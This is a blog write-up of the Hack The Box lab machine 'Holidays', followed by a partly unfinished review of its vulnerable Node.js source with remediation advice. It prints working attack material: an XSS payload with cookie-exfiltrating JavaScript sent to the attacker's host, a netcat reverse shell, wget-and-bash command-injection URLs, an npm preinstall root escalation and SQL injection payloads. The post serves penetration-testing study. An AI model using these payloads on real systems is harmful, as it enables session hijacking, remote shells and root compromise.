---
layout: post
title:  "Hack The Box - Holidays - Source Code Analysis"
date:   2021-10-17 13:00:10 +0200
tags: ["Hack The Box","OSWE"]
---

# Introduction
The hack the box machine "Holidays" is a hard machine which requires knowledge in the areas of user agent filtering, SQL injections, XSS filter evasion, command injection and NodeJS packages. In this post, we study the coding mistakes behind the vulnerabilites and how to remediate them. Spotting vulnerabilties through code reviews is a very useful skill when performing white-box penetration testing, hence why writeups like this one might be useful!

![HolidayCard](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/card.png)

The next two sections provide an overview of the exploitation process followed by a code analysis to identify the vulnerabilites in the source code. Feel free to skip or skim the next section if you already know how to exploit this particular Hack The Box machine. 

# Overview of the Exploitation
The first step is to scan the host for open ports. This can be done using `nmap` by executing a command like `nmap -p- -sS -sC 10.10.10.25` which scans for all potentially open ports using a SYN scan followed by a version scan and scripts scan on the open ports. From the results, it is possible to see that port `22` and `8000` are open and that ssh and HTTP are running on these ports. The next step is to bruteforce for directories or files on the web application. Depending on the user agent, one might get different results. More specifically, some user agents result in a `200 OK` while others result in a `404 Not Found`. One of the user agents that works is "Linux". As such, the command below can be used to enumerate web pages and find a login panel at `http://10.10.10.25:8000/login`.

{% highlight none linenos %}
gobuster dir -u http://10.10.10.25:8000 -w /usr/share/seclists/Discovery/Web-Content/big.txt --useragent "Linux"
{% endhighlight %}

Next, sqlmap can be used to leak database content since there is an SQL injection vulnerability in the username field. This can be performed by capturing a login attempt in BURP, saving it to a file named "linux.req" and executing the following command.

{% highlight none linenos %}
sqlmap -r linux.req --level=5 --risk=3 -T users --dump -threads 10
{% endhighlight %}

From the output of the command, it is possible to obtain the username "RickA" and password hash "fdc8cd4cff2c19e0d1022e78481ddf36". This password hash can then be cracked with an online cracking tool such as [crackstation](https://crackstation.net/) to obtain the password "nevergonnagiveyouup". Then, it is possible to login with these credentials at the login panel at `http://10.10.10.25:8000/login`. After login in, we are redirected to `http://10.10.10.25:8000/agent` where we can see different bookings. Clicking on a booking leads us to a page `http://10.10.10.25:8000/vac/[ID]` where `[ID]` is the id of the booking. On this page, we can click the "Notes" tab to reach the page shown below, where we can add a note to the selected booking. In addition, there is a text message stating that all notes has to be approved my an administrator.

![addNote](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/addNote.png)

At this point, one could suspect that a stored XSS vulnerability could be present since submitted notes might not be filtered appropriately. It is, however, not easy to verify this since we can not see the notes we submit until an administrator reviews them. However, after playing around a bit with various payloads and filter evasion techniques, it is possible to verify that an XSS vulnerability exists by tricking the administrators browser to perform a request to our host. More specifically, it is possible to inject javascript code in the administrators browser by abusing an `img` tag while representing the javascript payload with character codes. The template below can be used for creating notes which execute javascript in the administrators browser. Note that `[payload]` is a sequence of comma separated integers which result in a javascript payload when converted to a string using [UTF-16](https://en.wikipedia.org/wiki/UTF-16).

{% highlight javascript linenos %}
<img src="x/><script>eval(String.fromCharCode([payload]));</script>">
{% endhighlight %}

Representing javascript with character codes can be automated in python, as shown below. To make things easy, we use a payload which requests a javascript file from a remote host which it then executes. We save this file with the name "generateEvilNote.py" for later use. Note that the ip `10.10.14.25` is the ip of the attacking computer and might thus be different depending on the VPN connection.

{% highlight python linenos %}
payload = """document.write('<script src="http://10.10.14.25/x.js"></script>')"""
nums = [str(ord(i)) for i in payload]
print('<img src="x/><script>eval(String.fromCharCode('+','.join(nums)+'));</script>">')
{% endhighlight %}

Next, we put the javascript below in a file named "x.js". This code requests a specific booking page, encodes the response with base64 and then sends us the base64 encoded response.

{% highlight Javascript linenos %}
req1 = new XMLHttpRequest();
req1.open("GET","http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65",false);
req1.send();
req2 = new XMLHttpRequest();
req2.open("GET","http://10.10.14.25/leak?x="+btoa(req1.responseText),false);
req2.send();
{% endhighlight %}

Then, we start a web server by executing 
`sudo python3 -m http.server 80` in the directory where the `x.js` file is located. Thereafter, we generate the payload by executing `python3 generateEvilNote.py`, submit it as a note and wait for less than a minute. After waiting for a bit, the web server receives a request for the `x.js` file and a subsequent request which leaks the base64 encoded response. We can then proceed by copying the base64 encoded content from the web server output and putting it in a file named "x.b64". Then, we simply execute the command below, retrieve the cookie named "connect.sid" from the output of the command, place it in our browser session and navigate to `http://10.10.10.25:8000/admin`. 

{% highlight javascript linenos %}
cat x.b64 | base64 -d
{% endhighlight %}

At this point, we have hijacked the administrators session and navigating to the URL thus leads us to the page shown below. 

![export](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/export.png)

Among other things, there is a possiblity to export tables by pushing the buttons at the bottom of the page. Pushing one of the buttons sends a `GET` requests to the "/admin/export" endpoint which includes a table name in a parameter named "table". After trying to send a variety of URL encoded special characters through this parameter, it is possible to deduce that the value of the `table` parameter is placed in a bash command which is executed. However, there is a filter in place which only allows for certain characters. One of the characters is the ampersand character `&` which can be used to execute any bash commands which can pass the filter.

{% highlight bash linenos %}
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9000 >/tmp/f
{% endhighlight %}

Armed with this information, we can create a file named `rs` with the content above. We place this in the web server root of the python web server started earlier. We then start a listener by executing the command `nc -lvnp 9000` and visit the two URLs below to download and execute the reverse shell payload in the `rs` file. Note that `%26` is the URL encoded representation of the ampersand character `&`.

{% highlight none linenos %}
http://10.10.10.25:8000/admin/export?table=x%26wget+168431129/rs
http://10.10.10.25:8000/admin/export?table=x%26bash+rs
{% endhighlight %}

Once these two URLs have been visited, the netcat listener receives a connection from the target and we are greeted with a bash prompt, as can be seen below.

![rce](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/rce.png)

The next step is to perform a privilege escalation to get code execution as `root`. The privilege escalation can be performed by abusing sudo rights on npm. By executing `sudo -l`, it is possible to see the line `(ALL) NOPASSWD: /usr/bin/npm i *` which means that we can install arbitrary Node packages with root privileges. This could be dangerous as it is possible install an NPM package which runs a set of bash commands before the installation process begins. To create such a package, we execute the command `mkdir privescPackage` and create a file named "package.json" in the newly created directory `privescPackage`. We then fill the `package.json` file with the content below. Note that we won't need to create the main file `index.js`, defined on line 4, since the payload should be executed before the installation.

{% highlight json linenos %}
{
  "name": "privescPackage",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {
    "preinstall": "/bin/bash -i"
  }
}
{% endhighlight %}

At line 6, it is stated that the command `/bin/bash -i` should be executed before the installation begins. Next, we simply attempt to install the package using the command `sudo npm i privescPackage --unsafe`. Shortly after executing the command, we acquire a shell on the target as the `root` user, as can be seen in the image below

![root](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/root.png)

<!-- echo 'ewogICJuYW1lIjogInByaXZlc2NQYWNrYWdlIiwKICAidmVyc2lvbiI6ICIxLjAuMCIsCiAgIm1haW4iOiAiaW5kZXguanMiLAogICJzY3JpcHRzIjogewogICAgInByZWluc3RhbGwiOiAiL2Jpbi9iYXNoIC1pIgogIH0KfQo=' | base64 -d > ./privescPackage/package.json 
echo 'bW9kdWxlLmV4cG9ydHMgPSAiVGhpcyBzdHJpbmcgZG9lcyBub3QgbWF0dGVyIjsK' | base64 -d > ./privescPackage/index.js
Note that preinstall is executed when we run npm install. In fact these scripts are executed:
https://docs.npmjs.com/cli/v7/using-npm/scripts#npm-install

Package.json 
https://docs.npmjs.com/cli/v7/configuring-npm/package-json#name
-->

# Code Analysis
To get started with the code analysis, I started by downloading the code from the machine using the `SCP` command. More specifically, I changed the password of the `root` user to "root" by executing `passwd`. Then, I downloaded the folder `/home/algernon/app` by executing `scp -r root@10.10.10.25:/home/algernon/app /tmp/app` and typing the password "root". 

![files](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/files.png)

After downloading the folder, I opened it in the text editor VSCode. This showed me the files which are visible in the image above. The folder had a file named "package.json" which stated that the main file was named "index.js". As such, this file became the starting point for the analysis.

## User Agent Filtering

The content of the project's `index.js` file is shown below. Here, the `waterfall` function is used to call multiple functions. One of these functions was the `setupApp` function(line x) which called the `appSetup` function whose code can be found in the file `/home/algernon/app/setup/app.js`. 
{% highlight Javascript linenos %}
var async = require('async');

var dbSetup = require('./setup/db');
var appSetup = require('./setup/app');
var routerSetup = require('./setup/router');
var serverSetup = require('./setup/server');
var xssSetup = require('./setup/xss');

var scope = { };

async.waterfall([
	function setupDb(callback) {
		dbSetup(function(err, db) {
			scope.db = db;
			return callback();
		});
	},
	function setupApp(callback) {
		appSetup(function(err, app, router) {
			scope.app = app;
			scope.router = router;
			return callback();
		});
	},
	function setupRouter(callback) {
		routerSetup(scope, callback);
	},
	function setupServer(callback) {
		serverSetup(scope, function(err, server) {
			scope.server = server;
			return callback();
		});
	},
	function setupXss(callback) {
		xssSetup(scope, callback);
	}
], function() {
	console.log('Server up');
});
{% endhighlight %}

The `app.js` file contained a function which defined an anonymous function that ensured that different HTTP responses was provided for different user-agents. More specifically, it used the NodeJS Module `express-useragent` and would not allow access to any web pages unless either `req.useragent.isDesktop` or `req.useragent.isMobile` were `True`. 
{% highlight Javascript linenos %}
[...]
var useragent = require('express-useragent');

module.exports = function(callback) {
  var app = express();
  var router = express.Router();

  app
    .use(compression())
    .use(useragent.express())
    .use(function(req, res, next) {
      if (req.useragent.isDesktop || req.useragent.isMobile) return next()

      res.status(404)
      return next('Cannot GET ' + req.path)
    })
[...]
    .use(router);
  return callback(null, app, router);
};
{% endhighlight %}

{% highlight Javascript linenos %}

{% endhighlight %}
The project also contained a folder named "Node_modules" which contained all NodeJS packages which it used. As such, there was another folder in this folder named "express-useragent" which corresponded to the `express-useragent` module.
By studying the `package.json` file of the `express-useragent` module, we find the line below which states that the main file of the module is `index.js`.

{% highlight Javascript linenos %}
"main": "./index.js",
{% endhighlight %}

The content of the `index.js` file of the `express-useragent` module is shown below.
{% highlight Javascript linenos %}
var usrg = require('./lib/express-useragent');
var UserAgent = usrg.UserAgent;
module.exports = new UserAgent();
module.exports.UserAgent = UserAgent;
module.exports.express = function () {
return function (req, res, next) {
    var source = req.headers['user-agent'] || '';
    if (req.headers['x-ucbrowser-ua']) {  //special case of UC Browser
        source = req.headers['x-ucbrowser-ua'];
    }
    var ua = new UserAgent();
    if (typeof source === 'undefined') {
        source = "unknown";
    }
    ua.Agent.source = source.replace(/^\s*/, '').replace(/\s*$/, '');
    ua.Agent.os = ua.getOS(ua.Agent.source);
    ua.Agent.platform = ua.getPlatform(ua.Agent.source);
    ua.Agent.browser = ua.getBrowser(ua.Agent.source);
    ua.Agent.version = ua.getBrowserVersion(ua.Agent.source);
    ua.testNginxGeoIP(req.headers);
    ua.testBot();
    ua.testMobile();
    ua.testAndroidTablet();
    ua.testTablet();
    ua.testCompatibilityMode();
    ua.testSilk();
    ua.testKindleFire();
    req.useragent = ua.Agent;
    if ('function' === typeof res.locals) {
        res.locals({useragent: ua.Agent});
    } else {
        res.locals.useragent = ua.Agent;
    }
    next();
  };
};
{% endhighlight %}

After searching through the functions from line x to x, it can be deduced that the only function which modfies the `isMobile` or `isDesktop` booleans is the `testMobile` function shown below. 
To pass the if statement in the source code seen earlier, we need either `isMobile` or `isDesktop` to be true. As such, we only need to match any of the `case` statements in any of the `switch` statements in the code. For example, if `ua.Agent.isChromeOs` is `True`, `isDesktop` will become `True` and we will get a `200 OK` from the web application when requesting the "/login" page. 
{% highlight Javascript linenos %}
this.testMobile = function testMobile() {
  var ua = this;
  switch (true) {
    case ua.Agent.isWindows:
    case ua.Agent.isLinux:
    case ua.Agent.isMac:
    case ua.Agent.isChromeOS:
      ua.Agent.isDesktop = true;
      break;
    case ua.Agent.isAndroid:
    case ua.Agent.isSamsung:
      ua.Agent.isMobile = true;
      ua.Agent.isDesktop = false;
      break;
    default:
  }
  switch (true) {
    case ua.Agent.isiPad:
    case ua.Agent.isiPod:
    case ua.Agent.isiPhone:
    case ua.Agent.isBada:
    case ua.Agent.isBlackberry:
    case ua.Agent.isAndroid:
    case ua.Agent.isWindowsPhone:
      ua.Agent.isMobile = true;
      ua.Agent.isDesktop = false;
      break;
    default:
  }
  if (/mobile/i.test(ua.Agent.source)) {
    ua.Agent.isMobile = true;
    ua.Agent.isDesktop = false;
  }
};
{% endhighlight %}
By further studying the package code, it is possible to notice the `getOS` function, shown below. This function sets the boolean properties which could be seen in the previous code block (`isWindows`, `isLinux`, `isMac` e.t.c), using regular expressions. 

{% highlight Javascript linenos %}
this.getOS = function (string) {
    switch (true) {
        case this._OS.WindowsVista.test(string):
            this.Agent.isWindows = true;
            return 'Windows Vista';
        case this._OS.Windows7.test(string):
            this.Agent.isWindows = true;
            return 'Windows 7';
{% endhighlight %}

At the top of the same file, we can see the definition of the `_OS` object. Part of this object is shown below. This object contains regular expressions which correspond to different operating systems. For example, one of the strings is `/cros/i` which corresponds to ChromeOS. 

{% highlight Javascript linenos %}
this._OS = {
  Windows10: /windows nt 10\.0/i,
  Windows81: /windows nt 6\.3/i,
  [...]
  ChromeOS: /cros/i,
};
{% endhighlight %}

This means that we should be able to send in a string with the content "cros" to set the `isDesktop` variable to `True` and reach the login page. We can validate this hypothesis by sending a request with a user agent set to "cros". The pictures below shows such a request and the corresponding response headers in burp. As can be seen at the top of the response, the status code is `200 OK`, meaning that we succesfully passed the User Agent filter.

![ua1](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/ua1.png)

![ua2](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/ua2.png)

As a final note, if this code was present in a real web application, the general recommendation would have been to not rely on the `User-Agent` header for access control since the `User-Agent` header is controllable by the end user.

## SQL Injection Vulnerability

The web application uses an [sqlite](https://www.sqlite.org/index.html) database which is filled by the `setupDB` function whose code is located in the `db.js` file. The `router.js` file contains the code which is executed when specific endpoints are queried. This code is configured from the `index.js` file, shown below.
{% highlight Javascript linenos %}
[...]
var routerSetup = require('./setup/router');
[...]
var scope = { };

async.waterfall([
[...]
	function setupRouter(callback) {
		routerSetup(scope, callback);
	},
[...]
]
[...]
);
{% endhighlight %}

{% highlight Javascript linenos %}
module.exports = function(scope, callback) {
  [...]
  scope.router.post('/login', function(req, res) {
    if (req.body.username == 'admin' && req.body.password == 'myvoiceismypassport') {
      req.session.username = 'admin';
      req.session.admin = true;
      res.redirect('/admin');
    } else {
      var query = 'SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "' + req.body.username +'"))';
      var queryStart = +new Date();

      scope.db.get(query, function(err, row) {
        var queryEnd = +new Date();
        var queryTime = queryEnd - queryStart;
        if (err) return res.render('login.hbs', { internalError: err, publicError: 'Error Occurred', query: query, queryTime: queryTime });
        if (!row) return res.render('login.hbs', { publicError: 'Invalid User', query: query, queryTime: queryTime });
        if (row.password == crypto.createHash('md5').update(req.body.password).digest('hex')) {
          req.session.username = row.username;
          res.redirect('/agent');
        } else {
          res.render('login.hbs', { username: row.username, publicError: 'Incorrect Password', query: query, queryTime: queryTime });
        }
      });
    }
  });
  [...]
};
{% endhighlight %}

The code block above shows the code in the `router.js` file which correspodns to the `routerSetup` function. What is important to note here is that the `req.body.username` parameter is placed into the query string at line 9, without first being filtered. This query string is assigned to the parameter `query` which is then sent to the the database through the `scope.db.get` function call at line 12. This means that the statement below is the statement which is executed by the database. Note that `[username]` represents the username supplied in the body of the login request.

`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "[username]"))` 

If we let `[username]` be `") OR HEX(RANDOMBLOB(100000000)) OR ("x`, we can force a time delay to verify that we have remote code execution on the machine by turning the query into the query shown below. This works by creating a large random binary object and converting it to hex using the `RANDOMBLOB` and `HEX` functions, which will take a couple of seconds. The last part of the username `OR ("x` is used to ensure that the query is still a valid query after the injection.

`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "") OR HEX(RANDOMBLOB(100000000)) OR ("x"))` 

![delay](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/delay.png)

It can be validated that this payload works by using `curl`, as shown in the image above(By studing the "Total time" field). At this point, data can be exfiltrated through time-based blind SQL injection attacks, either manually or automatically using automated tools like sqlmap. 

To prevent SQL Injection vulnerabilities, the general recommendation is to use prepared statemnts. It is also, normally, strongly recommended to always filter user supplied input using a white list of allowed characters. This is important since it prevents special characters from being interpreted in dangerous ways.

## XSS Vulnerability
{% highlight Javascript linenos %}
var xss = require('xss');
var xssFilter = new xss.FilterXSS({
  whiteList: {
    img: ['src']
  },
  onTagAttr: function (tag, name, value, isWhiteAttr) {
    if (name === 'src' && isWhiteAttr) return name + '=' + value.replace(/["' ]/g, '') + '';
    return null;
  }
});
{% endhighlight %}

This issue is not so difficult to spot. Remediations should be to not exclude certain tags from a filtering mechanism. In addition, it is important to always apply HTML encoding before outputting special characters to the DOM.

router.js contains the code
{% highlight Javascript linenos %}
scope.router.get('/vac/:uuid', function(req, res) {
  if (!req.params.uuid) return res.redirect('/login');

  scope.db.all('SELECT bookings.*, notes.id AS note_id, notes.body AS note_body, notes.created AS note_created, notes.approved AS note_approved FROM bookings LEFT JOIN notes ON notes.booking_id = bookings.id WHERE bookings.uuid=? ORDER BY note_created ASC', [req.params.uuid], function(err, rows) {
    if (err || !rows || !rows.length) return res.redirect('/login');

    var transformedRows = rows.reduce(function(previous, current) {
      if (!previous[current.uuid]) {
        previous[current.uuid] = current;
        previous[current.uuid].notes = [ ];
      }

      if (current.note_body) {
        previous[current.uuid].notes.push({
          body: xssFilter.process(current.note_body, { onIgnoreTagAttr: function(tag, name, value, isWhiteAttr) { console.log(arguments); if (name === "src" && isWhiteAttr) { return value; } return null; } }),
          created: moment(current.note_created).format("dddd, MMMM Do YYYY, h:mm:ss a"),
          approved: current.note_approved,
          id: current.note_id
        });
      }

      return previous;
    }, { });
    var transformedRows2 = Object.keys(transformedRows).map(function(curKey) {
      if (!transformedRows[curKey].notes.length) delete transformedRows[curKey].notes;
      return transformedRows[curKey];
    });

    var row = transformedRows2[0];

    row.start = moment(row.start).format("dddd, MMMM Do YYYY, h:mm:ss a");
    row.end = moment(row.end).format("dddd, MMMM Do YYYY, h:mm:ss a");
    res.render('vac.hbs', { booking: row, username: req.session.username, admin: req.session.admin, cookie: req.headers.cookie });
  });
});
{% endhighlight %}

TODO: Removes spaces?

## Command Injection Vulnerability

The `scope.router.get` function is used to define an endpoint. In this particular case, line 1 states that the endpoint "/admin/exports" can be reached by get requests and that any such requests should be handled by the function which is defined on line 2 to 13.

The regex `/[^a-z0-9& \/]/g` matches everything that is not an alphanumeric character, the `&` character, the space character and the forward slash `/` character. Anything that is matched will be subsituted for the empty string `''`. In other words, any character outside of these characters, will be removed. In addition, the server will respond with a "500 Internal server error" error message. 

Once the characters have passed the filter, they go into x

`sqlite3 hex.db SELECT * FROM [userInput]` where [userInput] are the characters the user submitted. This assumes that all characters passed the white list

`sqlite3 hex.db SELECT * FROM table && sleep 2`

From file "./app/setup/router.js"
{% highlight Javascript linenos %}
scope.router.get('/admin/export', function(req, res) {
  console.log('Admin Export', req.query)
  if (!req.session.admin) return res.redirect('/login');
  var filteredTable = req.query.table.replace(/[^a-z0-9& \/]/g, '')
  if (filteredTable != req.query.table) return res.status(500).send('Invalid table name - only characters in the range of [a-z0-9&\\s\\/] are allowed');

  exec('sqlite3 hex.db SELECT\\ *\\ FROM\\ ' + filteredTable, function(err, stdout, stderr) {
    res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate');
    res.header('Expires', '-1');
    res.header('Pragma', 'no-cache');
    res.attachment('export-' + req.query.table + '-' + (+new Date()));
    res.send(stdout);
  });
});
{% endhighlight %}

Definition of the `exec` function.

{% highlight Javascript linenos %}
var exec = require('child_process').exec;
{% endhighlight %}

<!---
# Furher Readingo
Checkout: automating hackthebox holidays
-->


